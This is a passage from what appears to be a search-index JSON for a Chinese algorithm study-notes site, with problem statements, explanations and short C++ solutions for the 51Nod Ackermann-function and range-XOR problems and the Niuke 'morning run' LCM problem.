Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#15-sample-input","text":"1 1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#16-sample-output","text":"3","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#17-source","text":"51Nod 2656 \u963f\u514b\u66fc\u51fd\u6570","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#2","text":"\u5982\u679c\u76f4\u63a5\u4f7f\u7528 akm(m,n) \u8fdb\u884c\u8ba1\u7b97\uff0c\u6700\u540e\u4e00\u4e2a\u70b9\u4f1a\u8d85\u65f6\u3002\u8fd9\u65f6\u8003\u8651\u5230\u9898\u76ee\u6240\u7ed9\u7684\u6570\u636e\u8303\u56f4 0 \\le m \\le 3 \uff0c 0 \\le n\\le 16 \u6bd4\u8f83\u5c0f\uff0c\u5e26\u5165\u4e00\u4e9b\u6570\u5b57\u5c1d\u8bd5\u627e\u51fa akm(m,n) \u7684\u89c4\u5f8b\u3002 m n akm(m,n) m n akm(m,n) 1 1 3 2 1 5 1 2 4 2 2 7 1 3 5 2 3 9 1 n n+2 2 n 2n+3 m n akm(m,n) 3 1 13 3 2 29 3 3 61 3 4 125 3 n 2^{n+3} - 3 \u518d\u5c06\u627e\u51fa\u7684\u89c4\u5f8b\u5199\u6210\u4e00\u4e2a\u51fd\u6570\u8fdb\u884c\u8ba1\u7b97\u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/5.51Nod_2656_%E9%98%BF%E5%85%8B%E6%9B%BC%E5%87%BD%E6%95%B0/#3","text":"#include <algorithm> #include <iostream> #include <math.h> #include <string.h> using namespace std; int akm(int m, int n) { if (m == 0) { return n + 1; } else if (m > 0 && n == 0) { return akm(m - 1, 1); } else if (m > 0 && n > 0) { return akm(m - 1, akm(m, n - 1)); } else { return 0; } } long long calculate(int m, int n) { if (m == 0) { return n + 1; } else if (m == 1) { return n + 2; } else if (m == 2) { return 2 * n + 3; } else if (m == 3) { return pow(2, n + 3) - 3; } else { return 0; } } int main() { // test case int m, n; scanf(\"%d %d\", &m, &n); // \u8ba1\u7b97 printf(\"%lld\", calculate(m, n)); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/","text":"51Nod 2653 \u533a\u95f4xor # \u76ee\u5f55 # 51Nod 2653 \u533a\u95f4xor \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131,072 kB 1.2. Problem Description # \u7ed9\u51fa\u533a\u95f4 (a,b) \uff0c b \\ge a \uff0c\u6c42 a\\ xor\\ (a + 1)\\ xor\\ (a + 2)\\ \\dots \\ xor \\ b \u3002 1.3. Input # \u8f93\u51652\u4e2a\u6570\uff1a a b \uff0c\u4e2d\u95f4\u7528\u7a7a\u683c\u5206\u9694 (1 \\le a \\le b \\le 10^9) 1.4. Output # \u8f93\u51fa\u4e00\u4e2a\u7b54\u6848 1.5. Sample Input # 3 8 1.6. Sample Output # 11 1.7. Source # 51Nod 2653 \u533a\u95f4xor 2. \u89e3\u8bfb # \u8ba1\u7b97\u533a\u95f4 [1,b] \u7684\u533a\u95f4\u5f02\u6216\uff0c\u5373\u6c42 1\\ xor\\ 2\\ xor\\ 3\\ \\dots \\ xor \\ b \u6709\u5982\u4e0b\u89c4\u5f8b\u3002 \u5f53 n\\%4==0 \u65f6\uff0c f(n) = n ; \u5f53 n\\%4==1 \u65f6\uff0c f(n) = 1 ; \u5f53 n\\%4==2 \u65f6\uff0c f(n) = n+1 ; \u5f53 n\\%4==3 \u65f6\uff0c f(n) = 0 ; \u6570\u5b66\u4e0a\u53ef\u4ee5\u8bc1\u660e\u8fd9\u4e2a\u7ed3\u8bba\uff0c\u53ef\u4ee5\u53c2\u8003 Mychael\u7684\u535a\u5ba2\u56ed\u535a\u5ba2 \u3002 \u6211\u4eec\u53ef\u4ee5\u8bb0\u4f4f\u8fd9\u4e2a\u516c\u5f0f\uff0c\u6216\u8005\u901a\u8fc7\u5982\u4e0b\u5f52\u7eb3\u63a8\u5bfc\u51fa\u3002 n x cal(1,x) n x cal(1,x) 1 1 1 1 2 3 2 5 1 2 6 7 3 9 1 3 10 11 4 13 1 4 14 15 n 4n+1 1 n 4n+2 x+1 n x cal(1,x) 1 x cal(1,x) 1 3 0 1 4 4 2 7 0 2 8 8 3 11 0 3 12 12 4 15 0 4 16 16 n 4n+3 0 n 4n x \u5b9a\u4e49\u533a\u95f4\u5f02\u6216\u8fd0\u7b97\u4e3a cal(a, b) \uff0c\u53c8\u56e0\u4e3a\u5f02\u6216\u8fd0\u7b97 z = xor(x, y) \u7684\u9006\u8fd0\u7b97\u8fd8\u662f\u5f02\u6216\u8fd0\u7b97 y = xor(x, y) \u3002\u90a3\u4e48\u8981\u901a\u8fc7 cal(1,b) \u6c42 cal(a, b) \uff0c\u53ea\u9700\u518d\u5bf9 [1,a-1] \u8fdb\u884c\u4e00\u6b21\u5f02\u6216\u8fd0\u7b97\u5373\u53ef\u3002 cal(a, b) = cal(1, a - 1) \\ xor \\ cal(1, b) 3. \u4ee3\u7801 # #include <iostream> using namespace std; #define DEBUG long long seriesXor(long long m, long long n) { long long ans = m; for (long long i = m + 1; i <= n; i++) { ans ^= i; } return ans; } long long calculate(int x) { if (x % 4 == 0) { return x; } else if (x % 4 == 1) { return 1; } else if (x % 4 == 2) { return x + 1; } else if (x % 4 == 3) { return 0; } else { return 0; } } int main() { // \u8f93\u5165 int a, b, ans = 0; scanf(\"%d %d\", &a, &b); // \u8ba1\u7b97 ans = calculate(b) ^ calculate(a - 1); // \u8f93\u51fa printf(\"%d\\n\", ans); return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.51Nod 2653 \u533a\u95f4xor"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#51nod-2653-xor","text":"","title":"51Nod 2653 \u533a\u95f4xor"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#_1","text":"51Nod 2653 \u533a\u95f4xor \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131,072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#12-problem-description","text":"\u7ed9\u51fa\u533a\u95f4 (a,b) \uff0c b \\ge a \uff0c\u6c42 a\\ xor\\ (a + 1)\\ xor\\ (a + 2)\\ \\dots \\ xor \\ b \u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#13-input","text":"\u8f93\u51652\u4e2a\u6570\uff1a a b \uff0c\u4e2d\u95f4\u7528\u7a7a\u683c\u5206\u9694 (1 \\le a \\le b \\le 10^9)","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#14-output","text":"\u8f93\u51fa\u4e00\u4e2a\u7b54\u6848","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#15-sample-input","text":"3 8","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#16-sample-output","text":"11","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#17-source","text":"51Nod 2653 \u533a\u95f4xor","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#2","text":"\u8ba1\u7b97\u533a\u95f4 [1,b] \u7684\u533a\u95f4\u5f02\u6216\uff0c\u5373\u6c42 1\\ xor\\ 2\\ xor\\ 3\\ \\dots \\ xor \\ b \u6709\u5982\u4e0b\u89c4\u5f8b\u3002 \u5f53 n\\%4==0 \u65f6\uff0c f(n) = n ; \u5f53 n\\%4==1 \u65f6\uff0c f(n) = 1 ; \u5f53 n\\%4==2 \u65f6\uff0c f(n) = n+1 ; \u5f53 n\\%4==3 \u65f6\uff0c f(n) = 0 ; \u6570\u5b66\u4e0a\u53ef\u4ee5\u8bc1\u660e\u8fd9\u4e2a\u7ed3\u8bba\uff0c\u53ef\u4ee5\u53c2\u8003 Mychael\u7684\u535a\u5ba2\u56ed\u535a\u5ba2 \u3002 \u6211\u4eec\u53ef\u4ee5\u8bb0\u4f4f\u8fd9\u4e2a\u516c\u5f0f\uff0c\u6216\u8005\u901a\u8fc7\u5982\u4e0b\u5f52\u7eb3\u63a8\u5bfc\u51fa\u3002 n x cal(1,x) n x cal(1,x) 1 1 1 1 2 3 2 5 1 2 6 7 3 9 1 3 10 11 4 13 1 4 14 15 n 4n+1 1 n 4n+2 x+1 n x cal(1,x) 1 x cal(1,x) 1 3 0 1 4 4 2 7 0 2 8 8 3 11 0 3 12 12 4 15 0 4 16 16 n 4n+3 0 n 4n x \u5b9a\u4e49\u533a\u95f4\u5f02\u6216\u8fd0\u7b97\u4e3a cal(a, b) \uff0c\u53c8\u56e0\u4e3a\u5f02\u6216\u8fd0\u7b97 z = xor(x, y) \u7684\u9006\u8fd0\u7b97\u8fd8\u662f\u5f02\u6216\u8fd0\u7b97 y = xor(x, y) \u3002\u90a3\u4e48\u8981\u901a\u8fc7 cal(1,b) \u6c42 cal(a, b) \uff0c\u53ea\u9700\u518d\u5bf9 [1,a-1] \u8fdb\u884c\u4e00\u6b21\u5f02\u6216\u8fd0\u7b97\u5373\u53ef\u3002 cal(a, b) = cal(1, a - 1) \\ xor \\ cal(1, b)","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/6.51Nod_2653_%E5%8C%BA%E9%97%B4xor/#3","text":"#include <iostream> using namespace std; #define DEBUG long long seriesXor(long long m, long long n) { long long ans = m; for (long long i = m + 1; i <= n; i++) { ans ^= i; } return ans; } long long calculate(int x) { if (x % 4 == 0) { return x; } else if (x % 4 == 1) { return 1; } else if (x % 4 == 2) { return x + 1; } else if (x % 4 == 3) { return 0; } else { return 0; } } int main() { // \u8f93\u5165 int a, b, ans = 0; scanf(\"%d %d\", &a, &b); // \u8ba1\u7b97 ans = calculate(b) ^ calculate(a - 1); // \u8f93\u51fa printf(\"%d\\n\", ans); return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/","text":"\u725b\u5ba2\u7f51 NC14503 \u6668\u8dd1 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC14503 \u6668\u8dd1 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131,072 kB 1.2. Problem Description # \u201c\u65e0\u4f53\u80b2\uff0c\u4e0d\u6e05\u534e\u201d\u3001\u201c\u6bcf\u5929\u953b\u70bc\u4e00\u5c0f\u65f6\uff0c\u5065\u5eb7\u5de5\u4f5c\u4e94\u5341\u5e74\uff0c\u5e78\u798f\u751f\u6d3b\u4e00\u8f88\u5b50\u201d \u5728\u6e05\u534e\uff0c\u4f53\u80b2\u8fd0\u52a8\u7edd\u5bf9\u662f\u540c\u5b66\u4eec\u751f\u6d3b\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u90e8\u5206\u3002\u4e3a\u4e86\u54cd\u5e94\u5b66\u6821\u7684\u53f7\u53ec\uff0c\u6a21\u8303\u597d\u5b66\u751f\u738b\u961f\u957f\u51b3\u5b9a\u575a\u6301\u6668\u8dd1\u3002\u4e0d\u8fc7\u7531\u4e8e\u79cd\u79cd\u539f\u56e0\uff0c\u6bcf\u5929\u90fd\u65e9\u8d77\u53bb\u8dd1\u6b65\u4e0d\u592a\u73b0\u5b9e\uff0c\u6240\u4ee5\u738b\u961f\u957f\u51b3\u5b9a\u6bcf a \u5929\u6668\u8dd1\u4e00\u6b21\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5047\u5982\u738b\u961f\u957f\u67d0\u5929\u65e9\u8d77\u53bb\u8dd1\u4e86\u6b65\uff0c\u4e4b\u540e\u4ed6\u4f1a\u4f11\u606f a-1 \u5929\uff0c\u7136\u540e\u7b2c a \u5929\u7ee7\u7eed\u53bb\u6668\u8dd1\uff0c\u5e76\u4ee5\u6b64\u7c7b\u63a8\u3002 \u738b\u961f\u957f\u7684\u597d\u670b\u53cb\u5c0f\u94a6\u548c\u5c0f\u9488\u6df1\u53d7\u738b\u961f\u957f\u575a\u6301\u953b\u70bc\u7684\u9f13\u821e\uff0c\u5e76\u51b3\u5b9a\u81ea\u5df1\u4e5f\u8981\u575a\u6301\u6668\u8dd1\u3002\u4e3a\u4e86\u9002\u5b9c\u81ea\u5df1\u7684\u60c5\u51b5\uff0c\u5c0f\u94a6\u51b3\u5b9a\u6bcf b \u5929\u65e9\u8d77\u8dd1\u6b65\u4e00\u6b21\uff0c\u800c\u5c0f\u9488\u51b3\u5b9a\u6bcf c \u5929\u65e9\u8d77\u8dd1\u6b65\u4e00\u6b21\u3002 \u67d0\u5929\u65e9\u6668\uff0c\u738b\u961f\u957f\u3001\u5c0f\u94a6\u548c\u5c0f\u9488\u5728\u65e9\u8d77\u8dd1\u6b65\u65f6\u76f8\u9047\u4e86\uff0c\u4ed6\u4eec\u975e\u5e38\u6fc0\u52a8\u3001\u76f8\u4e92\u9f13\u52b1\uff0c\u5171\u540c\u5b8c\u6210\u4e86\u4e00\u6b21\u5b8c\u7f8e\u7684\u6668\u8dd1\u3002\u4e3a\u4e86\u8868\u8ff0\u65b9\u4fbf\uff0c\u6211\u4eec\u628a\u4e09\u4f4d\u540c\u5b66\u76f8\u9047\u7684\u8fd9\u5929\u8bb0\u4e3a\u7b2c 0 \u5929\u3002\u5047\u8bbe\u4e09\u4f4d\u540c\u5b66\u6bcf\u6b21\u6668\u8dd1\u7684\u65f6\u95f4\u6bb5\u548c\u8def\u7ebf\u90fd\u76f8\u540c\uff0c\u4ed6\u4eec\u60f3\u77e5\u9053\uff0c\u4e0b\u4e00\u6b21\u4e09\u4eba\u5728\u8dd1\u6b65\u65f6\u76f8\u9047\u662f\u7b2c\u51e0\u5929\u3002\u7531\u4e8e\u4e09\u4f4d\u540c\u5b66\u90fd\u4e0d\u4f1a\u7b97\uff0c\u6240\u4ee5\u5e0c\u671b\u7531\u806a\u660e\u7684\u4f60\u6765\u544a\u8bc9\u4ed6\u4eec\u7b54\u6848\u3002 1.3. Input # \u8f93\u5165\u5171\u4e00\u884c\uff0c\u5305\u542b\u4e09\u4e2a\u6b63\u6574\u6570 a,b,c \uff0c\u8868\u793a\u738b\u961f\u957f\u6bcf\u9694 a \u5929\u6668\u8dd1\u4e00\u6b21\u3001\u5c0f\u94a6\u6bcf\u9694 b \u5929\u6668\u8dd1\u4e00\u6b21\u4e14\u5c0f\u9488\u6bcf\u9694 c \u5929\u6668\u8dd1\u4e00\u6b21\u3002 1.4. Output # \u8f93\u51fa\u5171\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6b63\u6574\u6570 x \uff0c\u8868\u793a\u4e09\u4f4d\u540c\u5b66\u4e0b\u6b21\u5c06\u5728\u7b2c x \u5929\u76f8\u9047\u3002 1.5. Sample Input # 2 3 5 1.6. Sample Output # 30 1.7. Source # \u725b\u5ba2\u7f51 NC14503 \u6668\u8dd1 2. \u89e3\u8bfb # \u8ba1\u7b97\u4e09\u4e2a\u6570\u7684\u6700\u5c0f\u516c\u500d\u6570\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; // \u6c42\u6700\u5927\u516c\u7ea6\u6570 long long gcd(long long a, long long b) { return b == 0 ? a : gcd(b, a % b); } int main() { // test case long long a, b, c; scanf(\"%lld %lld %lld\", &a, &b, &c); // \u8ba1\u7b97\u6700\u5c0f\u516c\u500d\u6570 long long lcmNum = a * b / gcd(a, b); // \u8ba1\u7b97\u4e09\u4e2a\u6570\u7684\u6700\u5c0f\u516c\u500d\u6570 long long ans = lcmNum * c / gcd(lcmNum, c); // \u8f93\u51fa printf(\"%lld\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"7.\u725b\u5ba2\u7f51 NC14503 \u6668\u8dd1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#nc14503","text":"","title":"\u725b\u5ba2\u7f51 NC14503 \u6668\u8dd1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#_1","text":"\u725b\u5ba2\u7f51 NC14503 \u6668\u8dd1 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131,072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#12-problem-description","text":"\u201c\u65e0\u4f53\u80b2\uff0c\u4e0d\u6e05\u534e\u201d\u3001\u201c\u6bcf\u5929\u953b\u70bc\u4e00\u5c0f\u65f6\uff0c\u5065\u5eb7\u5de5\u4f5c\u4e94\u5341\u5e74\uff0c\u5e78\u798f\u751f\u6d3b\u4e00\u8f88\u5b50\u201d \u5728\u6e05\u534e\uff0c\u4f53\u80b2\u8fd0\u52a8\u7edd\u5bf9\u662f\u540c\u5b66\u4eec\u751f\u6d3b\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u90e8\u5206\u3002\u4e3a\u4e86\u54cd\u5e94\u5b66\u6821\u7684\u53f7\u53ec\uff0c\u6a21\u8303\u597d\u5b66\u751f\u738b\u961f\u957f\u51b3\u5b9a\u575a\u6301\u6668\u8dd1\u3002\u4e0d\u8fc7\u7531\u4e8e\u79cd\u79cd\u539f\u56e0\uff0c\u6bcf\u5929\u90fd\u65e9\u8d77\u53bb\u8dd1\u6b65\u4e0d\u592a\u73b0\u5b9e\uff0c\u6240\u4ee5\u738b\u961f\u957f\u51b3\u5b9a\u6bcf a \u5929\u6668\u8dd1\u4e00\u6b21\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5047\u5982\u738b\u961f\u957f\u67d0\u5929\u65e9\u8d77\u53bb\u8dd1\u4e86\u6b65\uff0c\u4e4b\u540e\u4ed6\u4f1a\u4f11\u606f a-1 \u5929\uff0c\u7136\u540e\u7b2c a \u5929\u7ee7\u7eed\u53bb\u6668\u8dd1\uff0c\u5e76\u4ee5\u6b64\u7c7b\u63a8\u3002 \u738b\u961f\u957f\u7684\u597d\u670b\u53cb\u5c0f\u94a6\u548c\u5c0f\u9488\u6df1\u53d7\u738b\u961f\u957f\u575a\u6301\u953b\u70bc\u7684\u9f13\u821e\uff0c\u5e76\u51b3\u5b9a\u81ea\u5df1\u4e5f\u8981\u575a\u6301\u6668\u8dd1\u3002\u4e3a\u4e86\u9002\u5b9c\u81ea\u5df1\u7684\u60c5\u51b5\uff0c\u5c0f\u94a6\u51b3\u5b9a\u6bcf b \u5929\u65e9\u8d77\u8dd1\u6b65\u4e00\u6b21\uff0c\u800c\u5c0f\u9488\u51b3\u5b9a\u6bcf c \u5929\u65e9\u8d77\u8dd1\u6b65\u4e00\u6b21\u3002 \u67d0\u5929\u65e9\u6668\uff0c\u738b\u961f\u957f\u3001\u5c0f\u94a6\u548c\u5c0f\u9488\u5728\u65e9\u8d77\u8dd1\u6b65\u65f6\u76f8\u9047\u4e86\uff0c\u4ed6\u4eec\u975e\u5e38\u6fc0\u52a8\u3001\u76f8\u4e92\u9f13\u52b1\uff0c\u5171\u540c\u5b8c\u6210\u4e86\u4e00\u6b21\u5b8c\u7f8e\u7684\u6668\u8dd1\u3002\u4e3a\u4e86\u8868\u8ff0\u65b9\u4fbf\uff0c\u6211\u4eec\u628a\u4e09\u4f4d\u540c\u5b66\u76f8\u9047\u7684\u8fd9\u5929\u8bb0\u4e3a\u7b2c 0 \u5929\u3002\u5047\u8bbe\u4e09\u4f4d\u540c\u5b66\u6bcf\u6b21\u6668\u8dd1\u7684\u65f6\u95f4\u6bb5\u548c\u8def\u7ebf\u90fd\u76f8\u540c\uff0c\u4ed6\u4eec\u60f3\u77e5\u9053\uff0c\u4e0b\u4e00\u6b21\u4e09\u4eba\u5728\u8dd1\u6b65\u65f6\u76f8\u9047\u662f\u7b2c\u51e0\u5929\u3002\u7531\u4e8e\u4e09\u4f4d\u540c\u5b66\u90fd\u4e0d\u4f1a\u7b97\uff0c\u6240\u4ee5\u5e0c\u671b\u7531\u806a\u660e\u7684\u4f60\u6765\u544a\u8bc9\u4ed6\u4eec\u7b54\u6848\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#13-input","text":"\u8f93\u5165\u5171\u4e00\u884c\uff0c\u5305\u542b\u4e09\u4e2a\u6b63\u6574\u6570 a,b,c \uff0c\u8868\u793a\u738b\u961f\u957f\u6bcf\u9694 a \u5929\u6668\u8dd1\u4e00\u6b21\u3001\u5c0f\u94a6\u6bcf\u9694 b \u5929\u6668\u8dd1\u4e00\u6b21\u4e14\u5c0f\u9488\u6bcf\u9694 c \u5929\u6668\u8dd1\u4e00\u6b21\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14503_%E6%99%A8%E8%B7%91/#14-output","text":"\u8f93\u51fa\u5171\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6b63\u6574\u6570 x \uff0c\u8868\u793a\u4e09\u4f4d\u540c\u5b66\u4e0b\u6b21\u5c06\u5728\u7b2c x \u5929\u76f8\u9047\u3002","title":"1.4. 